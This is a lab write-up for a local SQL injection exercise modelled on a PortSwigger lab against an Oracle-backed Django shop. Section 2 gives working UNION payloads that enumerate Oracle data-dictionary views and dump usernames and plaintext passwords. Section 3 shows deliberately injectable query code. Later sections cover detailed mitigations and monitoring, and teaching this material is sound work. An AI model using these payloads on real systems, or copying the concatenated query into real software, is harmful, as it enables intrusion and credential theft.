# Lab 06 — SQL injection attack, listing the database contents on Oracle

## 1. Lab overview

| Field | Value |
| --- | --- |
| PortSwigger reference | <https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle> |
| Lab id | `psw-sqli-06-list-db-contents-oracle` |
| Vulnerability class | SQL Injection — UNION-based data exfiltration against an Oracle backend |
| CWE | [CWE-89 — Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html) |
| Backend | Oracle Database Free 23c (`gvenzl/oracle-free:23-slim-faststart`), Django connecting as the `labuser` schema |
| Host URL | <http://127.0.0.1:18006/> |
| Flag | `FLAG{psw-sqli-06-list-db-contents-oracle-admin-access}` (revealed on `/my-account` after logging in as the seeded `administrator` whose password is generated at seed time) |

### Objective

The storefront `category` filter is concatenated into an Oracle `SELECT`. The goal is not to read products — it is to enumerate the Oracle data dictionary (`all_tables` / `all_tab_columns`, or `user_tables` / `user_tab_columns` under the current schema), discover a `users` table, extract the `administrator` row's plaintext password, authenticate through the benign `/login` endpoint, and read the flag from `/my-account`.

---

## 2. Exploit walkthrough

Oracle-specific gotchas that shape every payload:

- Every `SELECT` needs a `FROM` clause — there is no implicit `FROM dual` as in MySQL/SQLite. Any UNION branch that invents literal values must still end in `FROM dual`.
- Column counts and *types* must match between UNION branches. Oracle is stricter than MySQL: `UNION SELECT NULL,NULL,...` is the safe probe because `NULL` is type-compatible with every column.
- Comments are `--` (rest of line). URL-encoded as `--+` to force a trailing space through the query string.
- The data-dictionary views to target are `all_tables(owner, table_name)`, `all_tab_columns(owner, table_name, column_name)`, or the schema-scoped `user_tables` / `user_tab_columns`. In this lab the app connects as the `labuser` schema, so both views return a clean 3-table surface.

**Step 1 — baseline request**

```http
GET /filter?category=Gifts HTTP/1.1
Host: 127.0.0.1:18006
```

The server builds and runs:

```sql
SELECT id, name, category, description, price, released
FROM products
WHERE category = 'Gifts' AND released = 1
```

The page echoes the composed SQL in a debug pane, so every subsequent payload can be confirmed visually.

**Step 2 — determine the column count**

```
/filter?category=Gifts' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL FROM dual--+
```

Final query:

```sql
SELECT id, name, category, description, price, released
FROM products
WHERE category = 'Gifts' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL FROM dual-- ' AND released = 1
```

Six `NULL`s succeed. Five or seven throw `ORA-01789: query block has incorrect number of result columns`, visible in the error pane.

**Step 3 — find a text-compatible column**

Oracle requires UNION column *types* to match. Probe by substituting a string literal into each slot until the query returns without `ORA-01790`:

```
/filter?category=Gifts' UNION SELECT NULL,'abc',NULL,NULL,NULL,NULL FROM dual--+
```

Columns `name` and `description` accept strings (they are `VARCHAR2`/`CLOB`). Those are the exfiltration channels.

**Step 4 — enumerate the schema**

```
/filter?category=Gifts' UNION SELECT NULL,table_name,NULL,NULL,NULL,NULL FROM all_tables--+
```

With the `labuser` account this returns `PRODUCTS`, `USERS`, `FLAGS`, plus Django's internal tables (`DJANGO_MIGRATIONS`, etc.). The row of interest is `USERS`.

**Step 5 — enumerate columns of `USERS`**

```
/filter?category=Gifts' UNION SELECT NULL,column_name,NULL,NULL,NULL,NULL FROM all_tab_columns WHERE table_name='USERS'--+
```

Oracle folds unquoted identifiers to upper case, so the literal must be `'USERS'` (not `'users'`). The response lists `ID`, `USERNAME`, `PASSWORD`, `EMAIL`, `IS_ADMIN`.

**Step 6 — dump credentials**

```
/filter?category=Gifts' UNION SELECT NULL,username||':'||password,NULL,NULL,NULL,NULL FROM users--+
```

Oracle concatenation is `||`. The `name` column of each injected row now reads `administrator:<random-token>`, `wiener:peter`, `carlos:montoya`.

**Step 7 — authenticate and capture the flag**

```http
POST /login HTTP/1.1
Host: 127.0.0.1:18006
Content-Type: application/x-www-form-urlencoded

username=administrator&password=<recovered-token>
```

The login view is parameterised on purpose — see [shop/views.py:143](shop/views.py#L143) — so the only way in is with the recovered plaintext password. `/my-account` then checks `user.is_admin` and renders the flag.

---

## 3. Vulnerable code

### Vulnerable endpoint: `GET /filter`

[shop/views.py:95-102](shop/views.py#L95-L102)

```python
def filter_products(request: HttpRequest) -> HttpResponse:
    category = request.GET.get("category", "")

    query = (
        "SELECT id, name, category, description, price, released "
        "FROM products "
        "WHERE category = '" + category + "' AND released = 1"
    )
```

The `category` string is pasted directly between two literal single quotes. An attacker-supplied `'` closes the literal, everything after their `--` is discarded as an Oracle line comment, and the tail of the original query is neutered.

[shop/views.py:107-114](shop/views.py#L107-L114)

```python
    try:
        with connection.cursor() as cursor:
            cursor.execute(query)
            columns = [col[0].lower() for col in cursor.description]
            for row in cursor.fetchall():
                rows.append(
                    dict(zip(columns, (_lob_to_str(v) for v in row)))
                )
```

`cursor.execute(query)` is called with a single pre-composed string argument, bypassing `oracledb`'s bind-variable layer. Every column name is harvested from `cursor.description`, so the template can render the extra columns an attacker smuggles in through a `UNION` branch.

[shop/views.py:120-131](shop/views.py#L120-L131)

```python
    return render(
        request,
        "shop/filter.html",
        {
            "category": category,
            "rows": rows,
            "executed_sql": query,
            "error": error,
            ...
        },
    )
```

Two extra leaks: the composed SQL is reflected back via `executed_sql`, and the raw `oracledb` exception string is surfaced via `error`, giving the attacker `ORA-xxxxx` feedback for free column-count and type-matching probes.

### Safe counterpart (do not change)

[shop/views.py:143](shop/views.py#L143) — `User.objects.filter(username=username, password=password).first()` uses the ORM, which always parameterises. This is deliberate: making login injectable would let the learner skip enumeration entirely.

### Supporting models and seed

- [shop/models.py:18-36](shop/models.py#L18-L36) — `User` with plaintext `password` column (lab convenience; the teaching goal is credential *recovery* from the table).
- [shop/models.py:39-54](shop/models.py#L39-L54) — the `Flag` is stored in its own table so it cannot trivially be unioned out; the attacker must log in as an admin.
- [shop/management/commands/seed.py:57](shop/management/commands/seed.py#L57) — `admin_password = secrets.token_urlsafe(16)` ensures the password has to be *extracted*, never guessed.
- [shop/management/commands/seed.py:39](shop/management/commands/seed.py#L39) — the flag string itself.

### Container and DB configuration

- [docker-compose.yml:4-28](docker-compose.yml#L4-L28) — Oracle Free 23c is started and the app user is provisioned via the `APP_USER` / `APP_USER_PASSWORD` variables, so the Django process connects as the unprivileged `labuser` schema rather than as `SYSTEM`.
- [docker-compose.yml:35-44](docker-compose.yml#L35-L44) — loopback-only port binding (`127.0.0.1:18006:8000`) and the Oracle connection parameters.
- [sqli_lab/settings.py:54-61](sqli_lab/settings.py#L54-L61) — the Django `DATABASES` entry wires the Oracle engine to `labuser` via `oracledb`.

---

## 4. Why the vulnerability exists

| Root cause | Effect on an Oracle backend |
| --- | --- |
| **Raw string concatenation of `category` into SQL** | `oracledb` receives a finished string and cannot distinguish data from code. `'` / `--` / `UNION` all become syntactic. |
| **No allow-list or type check on `category`** | Arbitrary payloads — including UNION branches that read `all_tables`, `all_tab_columns`, `user_tables`, `user_tab_columns` — reach the database. |
| **Result set rendered generically via `cursor.description`** | The HTML table doesn't care what columns come back, so any value the attacker UNION-selects is displayed. Without that, the UNION would succeed but the exfiltrated strings would never be shown. |
| **`executed_sql` reflected to the client** | The attacker doesn't need to guess — the final assembled query is printed on the page. |
| **Raw Oracle exception text surfaced as `error`** | Column-count (`ORA-01789`) and column-type (`ORA-01790`) mismatches become single-request feedback. |
| **Plaintext passwords in `users`** | UNION extraction yields credentials that are immediately usable at `/login`. Hashing would raise the attacker's cost to "crack offline" rather than "paste back". |
| **Overly permissive default `GRANT`s on `all_tables` / `all_tab_columns`** | Every Oracle user has `SELECT` on these views for objects they can see. That's the core of the "list database contents" primitive. |

---

## 5. Code-level mitigation

### 5.1 Parameterise the query

The surgical fix is to stop building the query as a string and let `oracledb` bind the value:

```python
# shop/views.py — fixed
query = (
    "SELECT id, name, category, description, price, released "
    "FROM products "
    "WHERE category = :category AND released = 1"
)
with connection.cursor() as cursor:
    cursor.execute(query, {"category": category})
    rows = cursor.fetchall()
```

Django's Oracle backend also accepts positional `%s` placeholders (it rewrites them to Oracle `:arg0` style internally):

```python
cursor.execute(
    "SELECT id, name, category, description, price, released "
    "FROM products WHERE category = %s AND released = 1",
    [category],
)
```

Either form binds `category` as a `VARCHAR2` literal. `Gifts' UNION SELECT ...` is matched verbatim against the column and returns zero rows.

### 5.2 Prefer the ORM

```python
from .models import Product

def filter_products(request: HttpRequest) -> HttpResponse:
    category = request.GET.get("category", "")
    products = list(
        Product.objects
        .filter(category=category, released=True)
        .values("id", "name", "category", "description", "price", "released")
    )
```

Django's query compiler always binds parameters, always quotes identifiers correctly for Oracle's uppercase-folding rules, and removes the hand-rolled `WHERE` entirely.

### 5.3 Input allow-list

Categories are drawn from a known, small set (`Accessories`, `Tech`, `Lifestyle`, `Gifts`, `Pets`, `Clothing`). Reject anything else before the query runs:

```python
ALLOWED_CATEGORIES = {"Accessories", "Tech", "Lifestyle", "Gifts", "Pets", "Clothing"}

def filter_products(request):
    category = request.GET.get("category", "")
    if category not in ALLOWED_CATEGORIES:
        return HttpResponseBadRequest("unknown category")
    ...
```

### 5.4 Never reflect SQL or driver errors

Remove `executed_sql` and the raw Oracle exception from the context. In production, `except oracledb.DatabaseError` should log the `ORA-` code server-side and return a generic 500. The filter.html block around lines 17-27 should be deleted along with the context keys.

### 5.5 Hash the stored passwords

Even if the storefront is locked down, any future SQLi anywhere in the app will dump `users`. Use Django's `contrib.auth` password hashers (argon2/bcrypt). The lab keeps plaintext for teaching reasons — production must not.

### 5.6 Render only the columns you expect

The template currently iterates `row.id`, `row.name`, ... from a dict built out of `cursor.description`. Hard-code the expected column set (or render from a typed model) so that a rogue UNION-injected column has nowhere to surface.

---

## 6. Network / infrastructure-level mitigation

### 6.1 Least-privilege Oracle account

`oracledb` should connect as a role that has only what it needs:

```sql
CREATE USER app_ro IDENTIFIED BY "...";
GRANT CREATE SESSION TO app_ro;
GRANT SELECT ON labuser.products TO app_ro;
GRANT SELECT, INSERT, UPDATE ON labuser.users TO app_ro;
-- NO access granted to DBA_*; use VPD to reduce visibility into ALL_*.
```

By default every Oracle user gets `SELECT` on `all_tables` and `all_tab_columns` for objects they can see. Two practical levers to shrink that:

- Make the app user own as little as possible and grant `SELECT` on only the tables it must read — `all_tables` will then list only those objects.
- For harder isolation, put the app user in a Pluggable Database (PDB) dedicated to this application (`FREEPDB1` is the lab's PDB). Nothing in another PDB is visible from there.

### 6.2 Virtual Private Database (VPD) on sensitive tables

Attach a row-level security policy to `users` and `flags` so even a successful `UNION SELECT ... FROM users` returns zero rows for the web app's session:

```sql
BEGIN
  DBMS_RLS.ADD_POLICY(
    object_schema   => 'LABUSER',
    object_name     => 'USERS',
    policy_name     => 'users_web_deny',
    policy_function => 'users_pkg.web_predicate',
    statement_types => 'SELECT'
  );
END;
/
```

The policy function returns `'1=0'` whenever `SYS_CONTEXT('USERENV','CLIENT_IDENTIFIER')` matches the web app's service identity. Credentials are read via a `SECURITY INVOKER` PL/SQL procedure invoked only from the login path.

### 6.3 Secure Oracle profile and resource limits

Apply a profile to the app account that blunts enumeration and brute force:

```sql
CREATE PROFILE app_profile LIMIT
  FAILED_LOGIN_ATTEMPTS 5
  PASSWORD_LIFE_TIME 60
  SESSIONS_PER_USER 20
  CPU_PER_CALL 3000
  LOGICAL_READS_PER_CALL 100000;
ALTER USER labuser PROFILE app_profile;
```

`CPU_PER_CALL` and `LOGICAL_READS_PER_CALL` cap a single query's cost, which kneecaps blind enumeration that scans `all_tab_columns` repeatedly. `FAILED_LOGIN_ATTEMPTS` slows credential-stuffing against `/login` if the attacker tries to reuse recovered passwords across accounts.

### 6.4 Audit the data dictionary

Turn on unified auditing for reads of sensitive dictionary views, at minimum:

```sql
CREATE AUDIT POLICY dict_recon
  ACTIONS SELECT ON SYS.ALL_TABLES,
          SELECT ON SYS.ALL_TAB_COLUMNS,
          SELECT ON SYS.USER_TABLES,
          SELECT ON SYS.USER_TAB_COLUMNS;
AUDIT POLICY dict_recon BY labuser;
```

A web app has no legitimate reason to select from `all_tab_columns` inside a `WHERE category = ...` query — a single hit should fire an alert.

### 6.5 Network segmentation

The Oracle listener is on a private Docker bridge (`psw-sqli-06-list-db-contents-oracle-net`) and never published to the host — see [docker-compose.yml:26-28](docker-compose.yml#L26-L28). The app port is bound to loopback only at [docker-compose.yml:36](docker-compose.yml#L36). Production should replicate that shape: the DB listener reachable only from the app tier, no egress from the DB container, and no SQL\*Net on the perimeter.

### 6.6 WAF

Deploy a WAF with the OWASP Core Rule Set. Rules of particular interest here:

- `REQUEST-942` — SQLi detection (matches `UNION SELECT`, `' OR 1=1`, `--`, stacked tautologies).
- Custom rule to block literal `ALL_TAB_COLUMNS` / `USER_TAB_COLUMNS` / `DBA_TAB_COLUMNS` / `FROM DUAL` in query strings for non-admin endpoints.
- `REQUEST-920` — protocol enforcement (rejects oversized query strings, malformed URL encoding).

WAF signatures are evadable (`UNION/**/SELECT`, Unicode folding, hex). Treat them as one layer on top of parameterised queries, not a replacement.

### 6.7 Monitoring and rate limiting

- Log every `ORA-` error at the app boundary. `ORA-01789` and `ORA-01790` appearing against `/filter?category=...` are high-signal injection indicators.
- Rate-limit `/filter` per client IP — the enumeration chain needs dozens of probes.
- Alert on response size anomalies: `/filter` normally returns 1–3 products; a response with 20 rows whose `description` column is `administrator:...` is an exfiltration.

---

## 7. Defense-in-depth checklist

- [ ] All DB calls use bind parameters (`:name` / `%s`) — no `+` or f-string SQL builders anywhere.
- [ ] ORM by default; raw SQL only where justified, reviewed, and parameterised.
- [ ] Input allow-lists for known-enumerable fields (`category`, status flags, sort keys).
- [ ] Passwords hashed with a modern KDF (argon2/bcrypt), never stored plaintext.
- [ ] Sensitive tables (`users`, `flags`, tenant data) protected by Oracle VPD or a dedicated DB role the web app cannot reach.
- [ ] App DB user granted only `CREATE SESSION` and explicit `SELECT` / `DML` on required tables; no `DBA_*`, no `SYS` views beyond what is strictly needed.
- [ ] Oracle profile enforcing `FAILED_LOGIN_ATTEMPTS`, `CPU_PER_CALL`, `LOGICAL_READS_PER_CALL`.
- [ ] Unified auditing on `ALL_TABLES` / `ALL_TAB_COLUMNS` / `USER_TAB_COLUMNS` reads from the app user.
- [ ] DB listener on a private network segment, app port on loopback, egress from DB container blocked.
- [ ] No SQL text or driver exception strings reflected to clients; generic error pages only.
- [ ] WAF in front of the app with CRS and a custom rule for data-dictionary view names.
- [ ] SAST in CI (`bandit`, `semgrep`) flagging `cursor.execute(f"...")`, `cursor.execute("..." + x)`, and Oracle-specific concatenation patterns.
- [ ] Automated DAST (sqlmap / Burp scanner) against every new endpoint that touches the DB.

---

## 8. References

- PortSwigger Web Security Academy — [SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
- PortSwigger — [SQL injection cheat sheet (Oracle notes: `FROM dual`, `||` concatenation, `all_tables` / `all_tab_columns`)](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- Oracle Database Reference — [`ALL_TABLES`](https://docs.oracle.com/en/database/oracle/oracle-database/23/refrn/ALL_TABLES.html) and [`ALL_TAB_COLUMNS`](https://docs.oracle.com/en/database/oracle/oracle-database/23/refrn/ALL_TAB_COLUMNS.html)
- Oracle Database Security Guide — [Using Oracle Virtual Private Database to Control Data Access](https://docs.oracle.com/en/database/oracle/oracle-database/23/dbseg/using-oracle-vpd-to-control-data-access.html)
- Oracle Database Security Guide — [Configuring Auditing (Unified Auditing)](https://docs.oracle.com/en/database/oracle/oracle-database/23/dbseg/configuring-audit-policies.html)
- `python-oracledb` docs — [Using Bind Variables](https://python-oracledb.readthedocs.io/en/latest/user_guide/bind.html)
- Django docs — [Executing custom SQL directly](https://docs.djangoproject.com/en/5.0/topics/db/sql/#executing-custom-sql-directly) (see the parameter-substitution warning)
- OWASP — [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- CWE-89 — <https://cwe.mitre.org/data/definitions/89.html>
- OWASP CRS — <https://coreruleset.org/>
